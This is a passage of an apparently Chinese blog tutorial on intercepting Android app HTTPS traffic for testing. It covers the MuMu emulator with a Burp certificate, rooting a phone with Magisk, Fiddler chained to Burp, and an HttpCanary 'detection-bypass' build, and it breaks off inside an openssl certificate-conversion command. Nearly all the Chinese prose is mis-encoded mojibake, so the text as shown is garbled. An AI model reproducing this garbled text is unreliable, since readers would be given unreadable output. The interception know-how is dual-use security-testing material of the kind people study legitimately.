æµé‡ã€‚ä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ¨¡æ‹Ÿå™¨çš„ç‰ˆæœ¬ä¸€èˆ¬é€‰æ‹© Android 7.0 ä»¥ä¸‹ï¼Œè‹¥ APP åº”ç”¨ç‰ˆæœ¬ä¸æ”¯æŒåœ¨ Android 7.0 ç‰ˆæœ¬ä»¥ä¸‹çš„æ‰‹æœºå®‰è£…åˆ™æ— æ³•è¿›è¡ŒæŠ“åŒ…ï¼Œå®‰è£…äº† APP æ‰“å¼€äº†ä¹Ÿåªæ˜¯é—ªé€€æ— æ³•è¿›å…¥ç•Œé¢ã€‚æ¨¡æ‹Ÿå™¨å…·ä½“æŠ“åŒ…æ“ä½œå¦‚ä¸‹ã€‚</p><h3 id="1ã€å®‰è£…æ¨¡æ‹Ÿå™¨"><a href="#1ã€å®‰è£…æ¨¡æ‹Ÿå™¨" class="headerlink" title="1ã€å®‰è£…æ¨¡æ‹Ÿå™¨"></a>1ã€å®‰è£…æ¨¡æ‹Ÿå™¨</h3><p>ç”µè„‘ä¸Šå®‰è£…å®‰å“æ¨¡æ‹Ÿå™¨ã€‚ä¸ªäººå¹³æ—¶æµ‹è¯•å–œæ¬¢ä½¿ç”¨ MuMu æ¨¡æ‹Ÿå™¨ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://adl.netease.com/d/g/a11/c/gw">https://adl.netease.com/d/g/a11/c/gw</a>  å®‰è£…åç•Œé¢å¦‚ä¸‹ï¼Œä¸‹å›¾éƒ¨åˆ†è½¯ä»¶ä¸ºæœ¬äººè‡ªå·±å®‰è£…çš„ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112145644738.png" data-caption="image-20221112145644738"><img src="/../images/app/Packet_capture/image-20221112145644738.png" alt="image-20221112145644738"></a></p><h3 id="2ã€é…ç½®è¯ä¹¦"><a href="#2ã€é…ç½®è¯ä¹¦" class="headerlink" title="2ã€é…ç½®è¯ä¹¦"></a>2ã€é…ç½®è¯ä¹¦</h3><p>æƒ³è¦æˆåŠŸæŠ“åŒ…ï¼Œå®‰è£…ä¿¡ä»»è¯ä¹¦å¿…ä¸å¯å°‘ã€‚Burp å¼€å¯ç›‘å¬ï¼Œç›‘å¬åœ°å€ä¸ºè¿æ¥ WIFI åçš„æœ¬æœº IPï¼Œé 127.0.0.1</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112150053906.png" data-caption="image-20221112150053906"><img src="/../images/app/Packet_capture/image-20221112150053906.png" alt="image-20221112150053906"></a></p><p>Burp ä¸­è®¾ç½®ç›‘å¬ä»£ç†ä¸ºæœ¬æœº IP </p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112150945417.png" data-caption="image-20221112150945417"><img src="/../images/app/Packet_capture/image-20221112150945417.png" alt="image-20221112150945417"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112151153064.png" data-caption="image-20221112151153064"><img src="/../images/app/Packet_capture/image-20221112151153064.png" alt="image-20221112151153064"></a></p><p>å°† Burp è¯ä¹¦ å®‰è£…åˆ°å®‰å“æ¨¡æ‹Ÿå™¨ä¸­å»ï¼Œè¿™é‡Œä¸‹è½½è¯ä¹¦ä¾ç„¶ä½¿ç”¨ç”µè„‘æµè§ˆå™¨ä¸‹è½½ï¼Œä½¿ç”¨æ¨¡æ‹Ÿå™¨ç›´æ¥ä¸‹è½½ä¸ªäººæ„Ÿè§‰ä¸å¤ªå¥½æ“ä½œã€‚æµè§ˆå™¨è®¾ç½® 192.168.1.102:9000 ä»£ç†ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112151340657.png" data-caption="image-20221112151340657"><img src="/../images/app/Packet_capture/image-20221112151340657.png" alt="image-20221112151340657"></a></p><p>è®¿é—® <a href="http://192.168.1.102:9000/">http://192.168.1.102:9000</a>  ï¼Œä¸‹è½½CA è¯ä¹¦ï¼Œä¸‹è½½åè¯ä¹¦åä¸º cacert.derï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è¯ä¹¦ååç¼€æ”¹ä¸º .cer ç„¶åå®‰è£…åˆ°å®‰å“æ¨¡æ‹Ÿå™¨ä¸­ï¼Œå³ cacert.cer</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221113164208412.png" data-caption="image-20221113164208412"><img src="/../images/app/Packet_capture/image-20221113164208412.png" alt="image-20221113164208412"></a></p><p>å®‰è£…è¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>æ‰“å¼€æ¨¡æ‹Ÿå™¨æ–‡ä»¶å…±äº«æ–‡ä»¶å¤¹ï¼ŒæŠŠ CA è¯ä¹¦æ‹‰å–è¿›å»</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112151943004.png" data-caption="image-20221112151943004"><img src="/../images/app/Packet_capture/image-20221112151943004.png" alt="image-20221112151943004"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152233341.png" data-caption="image-20221112152233341"><img src="/../images/app/Packet_capture/image-20221112152233341.png" alt="image-20221112152233341"></a></p><p>æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨ï¼Œè¿›å…¥ $MuMuå…±äº«æ–‡ä»¶å¤¹æ‰¾åˆ°è¯¥è¯ä¹¦ç‚¹å‡»è¿›è¡Œå®‰è£…</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152423683.png" data-caption="image-20221112152423683"><img src="/../images/app/Packet_capture/image-20221112152423683.png" alt="image-20221112152423683"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152437313.png" data-caption="image-20221112152437313"><img src="/../images/app/Packet_capture/image-20221112152437313.png" alt="image-20221112152437313"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152450976.png" data-caption="image-20221112152450976"><img src="/../images/app/Packet_capture/image-20221112152450976.png" alt="image-20221112152450976"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152511065.png" data-caption="image-20221112152511065"><img src="/../images/app/Packet_capture/image-20221112152511065.png" alt="image-20221112152511065"></a></p><h3 id="3ã€é…ç½®ä»£ç†"><a href="#3ã€é…ç½®ä»£ç†" class="headerlink" title="3ã€é…ç½®ä»£ç†"></a>3ã€é…ç½®ä»£ç†</h3><p>âš ï¸ æ³¨æ„ï¼ŒAPPæŠ“åŒ…æ— è®ºæ˜¯æ¨¡æ‹Ÿå™¨è¿˜æ˜¯çœŸæœºï¼Œè¿æ¥çš„ç½‘ç»œå¿…é¡»æ˜¯åŒä¸€WIFIï¼Œæ‰€ä»¥ Burp ç›‘å¬æ‰ä¼šè®¾ç½®ä¸ºæœ¬æœº IPï¼Œè€Œé 127.0.0.1ã€‚ä¸Šé¢å·²ç»é…ç½®å¥½ Burp æŠ“åŒ…æ‰€éœ€é…ç½®ï¼Œä¸‹é¢æˆ‘ä»¬åªéœ€è¦é…ç½®æ¨¡æ‹Ÿå™¨ä»£ç†å³å¯è¿›è¡ŒæŠ“åŒ…ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152907673.png" data-caption="image-20221112152907673"><img src="/../images/app/Packet_capture/image-20221112152907673.png" alt="image-20221112152907673"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152944897.png" data-caption="image-20221112152944897"><img src="/../images/app/Packet_capture/image-20221112152944897.png" alt="image-20221112152944897"></a></p><p>é…ç½®ç½‘ç»œä¸ Burp ä»£ç†ä¸€è‡´</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112153028958.png" data-caption="image-20221112153028958"><img src="/../images/app/Packet_capture/image-20221112153028958.png" alt="image-20221112153028958"></a></p><p>è¿™é‡Œéšä¾¿æ‰“å¼€ä¸€ä¸ªè½¯ä»¶ï¼ŒæˆåŠŸæŠ“å–åˆ° https æµé‡</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112153433552.png" data-caption="image-20221112153433552"><img src="/../images/app/Packet_capture/image-20221112153433552.png" alt="image-20221112153433552"></a></p><p>å¯¹äº†ï¼Œæ¨¡æ‹Ÿå™¨å¦‚ä½•å®‰è£… app ä¹Ÿç®€å•è¯´ä¸€ä¸‹ï¼Œå¯ä»¥é€šè¿‡æ¨¡æ‹Ÿå™¨åº”ç”¨å•†åº—ç›´æ¥ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ç”µè„‘ä¸Šè·å– apk åŒ…åç›´æ¥æ‹‰è¿›å»æ¨¡æ‹Ÿå™¨è¿›è¡Œå®‰è£…,æ¨¡æ‹Ÿå™¨åº•éƒ¨ä¹Ÿæœ‰ä¸ª APK å®‰è£…çš„é€‰é¡¹ã€‚</p><p>è‡³æ­¤ï¼Œæ¨¡æ‹Ÿå™¨æŠ“å– APP æµé‡å·²ç»å®Œæˆã€‚</p><h3 id="4ã€å°ç»“"><a href="#4ã€å°ç»“" class="headerlink" title="4ã€å°ç»“"></a>4ã€å°ç»“</h3><p>æ¨¡æ‹Ÿå™¨è¿›è¡Œ APP æµé‡æŠ“å–æ˜¯æœ€ä¸ºç®€å•æœ‰æ•ˆçš„æ–¹æ³•ï¼Œæœ¬äººå·¥ä½œä¸­ä¹Ÿæ˜¯é¦–é€‰è¿™ä¸€ç§ï¼Œä¸è¡Œæ‰è½¬å‘çœŸæœºæµ‹è¯•ã€‚</p><h2 id="ä¸‰ã€å®‰å“çœŸæœºæŠ“åŒ…"><a href="#ä¸‰ã€å®‰å“çœŸæœºæŠ“åŒ…" class="headerlink" title="ä¸‰ã€å®‰å“çœŸæœºæŠ“åŒ…"></a>ä¸‰ã€å®‰å“çœŸæœºæŠ“åŒ…</h2><h3 id="1ã€æ‰‹æœº-ROOTï¼ˆå°ç±³ï¼‰"><a href="#1ã€æ‰‹æœº-ROOTï¼ˆå°ç±³ï¼‰" class="headerlink" title="1ã€æ‰‹æœº ROOTï¼ˆå°ç±³ï¼‰"></a>1ã€æ‰‹æœº ROOTï¼ˆå°ç±³ï¼‰</h3><p>æ‰‹æœºéœ€è¦ ROOTï¼ˆç»å®æµ‹æœ‰äº› APP æ— éœ€ ROOT ä¹Ÿå¯ä»¥æŠ“å–åˆ°ï¼Œå®‰è£… CA è¯ä¹¦å³å¯ï¼Œè‡ªå·±æŒ‰å®é™…æƒ…å†µå»æµ‹è¯•æ˜¯å¦å¯è¡Œï¼‰ï¼Œæœ¬äººä½¿ç”¨çš„æ˜¯å°ç±³ MIX 2s ä½œä¸ºæ—¥å¸¸çš„æµ‹è¯•æœºï¼Œé€šè¿‡å®˜æ–¹è§£é”ã€‚å‚è€ƒè§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1er4y1C7wU/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1er4y1C7wU/?spm_id_from=333.337.search-card.all.click</a> ï¼Œåˆ·å…¥é¢å…·ï¼ˆROOTï¼‰æ•™ç¨‹ï¼š<a href="https://magiskcn.com/">https://magiskcn.com/</a></p><p>å…·ä½“çš„åˆ· ROOT è¿™é‡Œå°±ä¸å±•ç¤ºäº†ï¼Œå‚è€ƒè§†é¢‘å·²ç»éå¸¸è¯¦ç»†äº†ï¼Œå…¶ä»–æœºå‹è‡ªè¡Œæ¢ç´¢ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹åˆ·å…¥é¢å…·æ—¶é‡åˆ°çš„ä¸€äº›å°é—®é¢˜ã€‚åœ¨åˆ·å…¥é¢å…·æ—¶ï¼Œæ‰‹æœºè¿›å…¥ fastboot åæ’å…¥ USB ç”µè„‘æ— æ³•è¯†åˆ«è®¾å¤‡æ˜¯å¦æ’å…¥ï¼Œå¯¼è‡´è¾“å…¥é¢å…·æ—¶å‘Šè­¦ï¼š<code>&lt; waiting for any device &gt;</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171452091.png" data-caption="image-20221112171452091"><img src="/../images/app/Packet_capture/image-20221112171452091.png" alt="image-20221112171452091"></a></p><p>è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼Œæ‰‹æœºè¿›å…¥ fastboot æ¨¡å¼ï¼Œç”µè„‘æ’å…¥è¿æ¥æ‰‹æœºçš„ USB åï¼Œæ‰“å¼€ç”µè„‘è®¾å¤‡ç®¡ç†å™¨</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171645895.png" data-caption="image-20221112171645895"><img src="/../images/app/Packet_capture/image-20221112171645895.png" alt="image-20221112171645895"></a></p><p>é€‰æ‹©å…¶ä»–è®¾å¤‡-ã€‹é¼ æ ‡å³é”®æ›´æ–°é©±åŠ¨-ã€‹æµè§ˆæˆ‘çš„ç”µè„‘ä»¥æŸ¥æ‰¾é©±åŠ¨ç¨‹åº</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171755530.png" data-caption="image-20221112171755530"><img src="/../images/app/Packet_capture/image-20221112171755530.png" alt="image-20221112171755530"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171819591.png" data-caption="image-20221112171819591"><img src="/../images/app/Packet_capture/image-20221112171819591.png" alt="image-20221112171819591"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172012733.png" data-caption="image-20221112172012733"><img src="/../images/app/Packet_capture/image-20221112172012733.png" alt="image-20221112172012733"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172044274.png" data-caption="image-20221112172044274"><img src="/../images/app/Packet_capture/image-20221112172044274.png" alt="image-20221112172044274"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172119508.png" data-caption="image-20221112172119508"><img src="/../images/app/Packet_capture/image-20221112172119508.png" alt="image-20221112172119508"></a></p><p>é‡æ–°æ‰§è¡Œå‘½ä»¤ï¼ŒæˆåŠŸåˆ·å…¥é¢å…·ï¼Œå³æˆåŠŸ ROOTï¼Œç„¶åé‡å¯æ‰‹æœºå³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172210871.png" data-caption="image-20221112172210871"><img src="/../images/app/Packet_capture/image-20221112172210871.png" alt="image-20221112172210871"></a></p><h3 id="2ã€Fiddle-æŠ“åŒ…"><a href="#2ã€Fiddle-æŠ“åŒ…" class="headerlink" title="2ã€Fiddle æŠ“åŒ…"></a>2ã€Fiddle æŠ“åŒ…</h3><p>Fiddler ä¸‹è½½é“¾æ¥ï¼š<a href="https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe">https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe</a></p><p>é…ç½®æŠ“å– HTTPS æµé‡ï¼ŒTools-ã€‹Options-ã€‹HTTPS</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112211747086.png" data-caption="image-20221112211747086"><img src="/../images/app/Packet_capture/image-20221112211747086.png" alt="image-20221112211747086"></a></p><p>å‹¾é€‰ HTTPS</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112211915851.png" data-caption="image-20221112211915851"><img src="/../images/app/Packet_capture/image-20221112211915851.png" alt="image-20221112211915851"></a></p><p>å‹¾é€‰åä¼šå¼¹å‡ºå®‰è£…è¯ä¹¦çš„æç¤ºï¼Œæ ¹æ®æç¤ºä¸€ç›´ç‚¹å‡» æ˜¯ å®‰è£…å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112212110415.png" data-caption="image-20221112212110415"><img src="/../images/app/Packet_capture/image-20221112212110415.png" alt="image-20221112212110415"></a></p><p>é…ç½®ä»£ç†ç«¯å£ <code>Tools â€” Options â€” Connections</code>ï¼Œç«¯å£é€‰æ‹© <code>9000</code>ï¼ˆå¯éšæ„æ›´æ”¹ï¼‰ï¼Œå‹¾é€‰ <code>Allow remote computers to connect</code> ï¼Œç‚¹å‡» OKï¼Œé‡å¯ Fiddle ä½¿é…ç½®ç”Ÿæ•ˆ</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112212121623.png" data-caption="image-20221112212121623"><img src="/../images/app/Packet_capture/image-20221112212121623.png" alt="image-20221112212121623"></a></p><p>é…ç½®æ‰‹æœºç«¯ä»£ç†ä¸ Fiddler è®¾ç½®çš„ç«¯å£ä¸€è‡´ï¼Œè®© APP æµé‡èµ° Fiddlerã€‚è¿™é‡Œæ‰‹æœºä¹Ÿæ˜¯åŒä¸€ WIFI ä¸‹çš„æœ¬æœº IPã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112212429801.png" data-caption="image-20221112212429801"><img src="/../images/app/Packet_capture/image-20221112212429801.png" alt="image-20221112212429801"></a></p><p>é…ç½®åï¼Œåœ¨æ‰‹æœºæµè§ˆå™¨è®¿é—®ä¸Šé¢è®¾ç½®çš„ IP åœ°å€å’Œç«¯å£å·ï¼Œæˆ‘è¿™é‡Œæ˜¯ <code>192.168.1.102:9000</code>ï¼ˆè¿™é‡Œè¦æ ¹æ®å®é™…æƒ…å†µï¼‰ï¼Œç„¶å <code>FiddlerRoot certificate</code> è¿›è¡Œä¸‹è½½è¯ä¹¦ï¼Œå¹¶è‡ªè¡Œå®‰è£…é…ç½®</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112213636603.png" data-caption="image-20221112213636603"><img src="/../images/app/Packet_capture/image-20221112213636603.png" alt="image-20221112213636603"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112213435342.png" data-caption="image-20221112213435342"><img src="/../images/app/Packet_capture/image-20221112213435342.png" alt="image-20221112213435342"></a></p><p>éšä¾¿æ‰“å¼€ä¸€ä¸ª APP æŠ“åŒ…æˆåŠŸ</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121200703789.png" data-caption="image-20221121200703789"><img src="/../images/app/Packet_capture/image-20221121200703789.png" alt="image-20221121200703789"></a></p><h3 id="3ã€Fiddler-Burp-æŠ“åŒ…"><a href="#3ã€Fiddler-Burp-æŠ“åŒ…" class="headerlink" title="3ã€Fiddler + Burp æŠ“åŒ…"></a>3ã€Fiddler + Burp æŠ“åŒ…</h3><p>ç”±äºå¸¸å¹´ä½¿ç”¨ Burp ï¼Œçªç„¶è½¬åˆ° Fiddler ä¼šä¸ä¹ æƒ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å°† Fiddler æµé‡è½¬å‘åˆ° Burp å»ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ Fiddler æŠ“åŒ…åŸæœ‰çš„åŸºç¡€ä¸Šæ·»åŠ æµé‡è½¬å‘åˆ° Burp çš„é…ç½®å³å¯ã€‚</p><p>Burpå¼€å¯ç›‘å¬</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112220055883.png" data-caption="image-20221112220055883"><img src="/../images/app/Packet_capture/image-20221112220055883.png" alt="image-20221112220055883"></a></p><p>Fiddler é…ç½®ï¼Œ<code>Tools-ã€‹Options-ã€‹Gateway-ã€‹Manual Proxy Configuration</code> å¡«å†™ 127.0.0.1:8080 ä½¿ä¸ Burp çš„ç›‘å¬åœ°å€ä¸€è‡´ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112220244632.png" data-caption="image-20221112220244632"><img src="/../images/app/Packet_capture/image-20221112220244632.png" alt="image-20221112220244632"></a></p><p>APP ä¸Šç‚¹å‡»åŠŸèƒ½ç‚¹ï¼Œæµé‡ä» Fiddler è½¬å‘åˆ°äº† Burpï¼Œè¿™æ ·å°±æ¯”è¾ƒç›´è§‚äº†ï¼Œå›åˆ°ç†Ÿæ‚‰çš„ç•Œé¢ï¼Œä¹Ÿæ¯”è¾ƒå¥½æ“ä½œã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121200547725.png" data-caption="image-20221121200547725"><img src="/../images/app/Packet_capture/image-20221121200547725.png" alt="image-20221121200547725"></a></p><p>Fiddler çœŸæœºæŠ“åŒ…åŒæ ·ä¹Ÿå¯ä»¥åº”ç”¨åœ¨æ¨¡æ‹Ÿå™¨ä¸Šï¼Œæ­¥éª¤ç›¸åŒã€‚</p><h3 id="4ã€å°ç»“-1"><a href="#4ã€å°ç»“-1" class="headerlink" title="4ã€å°ç»“"></a>4ã€å°ç»“</h3><p>å…¶å®æˆ‘ä»¬çœŸæœºå¯ä»¥ç›´æ¥ä½¿ç”¨ Burp æŠ“å– App çš„æµé‡ï¼Œåªä¸è¿‡æœ‰æ—¶å€™ç”±äºä½¿ç”¨ Burp æŠ“å–çš„æµé‡ä» APP å›æµåˆ° Burp çš„æ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´ APP æ˜¾ç¤ºæ— å“åº”ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ Fiddler æŠ“åŒ…ï¼Œç›¸å¯¹æ¥è¯´ Fiddler å¯¹äº APP å’Œå°ç¨‹åºçš„æµé‡æŠ“å–ä¼šå¿«ä¸€ç‚¹ï¼Œä½†ç”±äº Fiddler ä¸ Burp ç›¸æ¯”ï¼ŒåŠŸèƒ½ä¸Šå’Œæ“ä½œä¸Š Burp åˆæ›´èƒœä¸€ç­¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±é€‰æ‹©ä½¿ç”¨ Fiddler æŠ“å–æµé‡ï¼Œç„¶åæŠŠ Fiddler çš„æµé‡è½¬å‘åˆ° Burp ä¸Šï¼Œä»¥è¾¾åˆ°æ›´ä¼˜çš„æµ‹è¯•ç¯å¢ƒã€‚<code>ï¼ˆFiddler + Burpsuite ä¸²è”æ—¶ Fiddler çš„æµé‡èµ° Burpsuite ä½¿ Burpsuite æ²¡æœ‰äº†æµé‡è§£æçš„è¿‡ç¨‹ï¼Œåªæ˜¯å•çº¯å°† Fiddler æµé‡è½¬å‘åˆ° Burpsuiteï¼Œæ‰€ä»¥ä¼šæ¯”è¾ƒå¿«ä¸€ç‚¹ï¼‰</code></p><h2 id="å››ã€æ‰©å±•"><a href="#å››ã€æ‰©å±•" class="headerlink" title="å››ã€æ‰©å±•"></a>å››ã€æ‰©å±•</h2><h3 id="1ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP-å¯æ­£å¸¸è”ç½‘ä½¿ç”¨"><a href="#1ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP-å¯æ­£å¸¸è”ç½‘ä½¿ç”¨" class="headerlink" title="1ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP å¯æ­£å¸¸è”ç½‘ä½¿ç”¨"></a>1ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP å¯æ­£å¸¸è”ç½‘ä½¿ç”¨</h3><ul><li><p>APP ä½¿ç”¨é HTTP åè®®ï¼Œå¦‚ TCPã€UDP æˆ–è€…ç§æœ‰åè®®è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡å¸¸è§„æ‰‹æ®µè¿›è¡ŒæŠ“åŒ…ï¼Œéœ€è¦è¿›è¡Œé€†å‘æå–å…¶ç®—æ³•è¿›è¡Œåˆ†æç ”ç©¶ã€‚</p></li><li><p>APP è®¾ç½®äº†ä¸èµ°ç³»ç»Ÿä»£ç†çš„é…ç½®ï¼Œå¯¼è‡´æ— æ³•é€šè¿‡ç³»ç»Ÿä»£ç†å°†æµé‡è½¬å‘åˆ°æŠ“åŒ…å·¥å…·ä¸Šï¼Œå¯é€šè¿‡ç¬¬ä¸‰æ–¹ä»£ç† APPï¼Œ HttpCanary è¿›è¡Œæµé‡æŠ“å–ã€‚</p></li></ul><p>æ ¹æ®ç½‘ä¸Šèµ„æºæ”¶é›†äº†å‡ ä¸ªç‰ˆæœ¬çš„ HTTPCannary ï¼Œ<a href="https://l13144.lanzoul.com/b00peu2kh">è¯·è‡ªè¡Œé€‰å–å¯ç”¨ç‰ˆæœ¬</a>ã€‚æœ¬äººè‡ªå·±åœ¨æ²¡ ROOT æ‰‹æœºä¸Šé€‰æ‹©äº†è¿‡æ£€ç‰ˆæˆåŠŸæŠ“å–åˆ°åº”ç”¨æµé‡ã€‚</p><p>å®‰è£…æ­¥éª¤ï¼š</p><ul><li><p>æ‰‹æœºä¸Šå®‰è£… HttpCanary è½¯ä»¶</p></li><li><p>å®‰è£…è¯ä¹¦</p></li></ul><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121203818209.png" data-caption="image-20221121203818209"><img src="/../images/app/Packet_capture/image-20221121203818209.png" alt="image-20221121203818209"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121203750042.png" data-caption="image-20221121203750042"><img src="/../images/app/Packet_capture/image-20221121203750042.png" alt="image-20221121203750042"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121203941186.png" data-caption="image-20221121203941186"><img src="/../images/app/Packet_capture/image-20221121203941186.png" alt="image-20221121203941186"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121204027908.png" data-caption="image-20221121204027908"><img src="/../images/app/Packet_capture/image-20221121204027908.png" alt="image-20221121204027908"></a></p><p>æŒ‰ç…§ä¸Šé¢å®‰è£…å®Œæˆåï¼Œæ— éœ€ç†ä¼š<code>å®‰è£…æ ¹è¯ä¹¦æŠ“å–SSLæ•°æ®åŒ…</code>æç¤ºï¼Œç‚¹å‡»å³ä¸‹è§’çš„å°é£æœºå˜ä¸ºç»¿è‰²å³å¼€å¯æŠ“åŒ…ï¼Œæ‰“å¼€APPå³å¯æŠ“å–åˆ°æ•°æ®åŒ…ï¼Œæ ¹æ®è‡ªå·±éœ€è¦è¿›è¡Œæµ‹è¯•ï¼Œä¹Ÿå¯ä»¥å°†  HttpCanary æŠ“å–åˆ°çš„æµé‡åŒ…å¤åˆ¶åˆ°Burpè¿›è¡Œé‡æ”¾ï¼Œå°±æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œæ ¹æ®è‡ªèº«éœ€æ±‚é€‰æ‹©ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121204554671.png" data-caption="image-20221121204554671"><img src="/../images/app/Packet_capture/image-20221121204554671.png" alt="image-20221121204554671"></a></p><h3 id="2ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP-æ— æ³•æ­£å¸¸è”ç½‘ä½¿ç”¨"><a href="#2ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP-æ— æ³•æ­£å¸¸è”ç½‘ä½¿ç”¨" class="headerlink" title="2ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP æ— æ³•æ­£å¸¸è”ç½‘ä½¿ç”¨"></a>2ã€æŠ“åŒ…å·¥å…·æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP æ— æ³•æ­£å¸¸è”ç½‘ä½¿ç”¨</h3><ul><li><p>å½“ä½¿ç”¨ Burp æˆ–è€… Fiddler æŠ“åŒ…æ—¶ï¼Œæ— æ³•æŠ“å–åˆ°æµé‡åŒ…ï¼Œæ‰‹æœºä¸Š APP ä¹Ÿæ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚åˆ™è€ƒè™‘ä¸ºè¯ä¹¦ä¿¡ä»»é—®é¢˜ï¼Œç”±äºéœ€è¦åˆ†æ HTTPS æµé‡ï¼Œæˆ‘ä»¬å¿…å®šéœ€è¦å®‰è£…ç›¸åº”çš„æŠ“åŒ…å·¥å…·è¯ä¹¦ï¼Œè€Œç³»ç»Ÿåˆå¯¹è¯¥è¯ä¹¦æ— æ³•ä¿¡ä»»ï¼Œå¯¼è‡´äº†æ— æ³•æŠ“å–åˆ°æµé‡ï¼ŒAPP ä¹Ÿæ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚</p></li><li><p>è§£å†³æ–¹æ¡ˆï¼š</p><p>å°†ç”¨æˆ·è¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿè¯ä¹¦åˆ—è¡¨ï¼Œæˆ‘ä»¬å®‰è£…è¯ä¹¦ä¸€èˆ¬åœ¨ç”¨æˆ·è¯ä¹¦åˆ—è¡¨ï¼Œæˆ‘ä»¬å°†å…¶ç§»åŠ¨åˆ°ç³»ç»Ÿè¯ä¹¦åˆ—è¡¨ï¼ˆæ­¤æ­¥éª¤éœ€è¦ ROOT ï¼ŒROOT åç”¨æˆ·æ‰èƒ½è®¿é—®ç³»ç»Ÿè¯ä¹¦è®¿é—®çš„ç›®å½•ï¼‰ï¼Œå®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1ï¼‰è½¬æ¢è¯ä¹¦æ ¼å¼</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// å®‰è£… openssl è½¬æ¢è¯ä¹¦çš„æ ¼å¼</span><br><span class="line">$ openssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEM</span><br><span class="line">// æå–è¯ä¹¦çš„hash</span><br><span class="line">$ openssl x509 -inform PEM -subject_hash -in 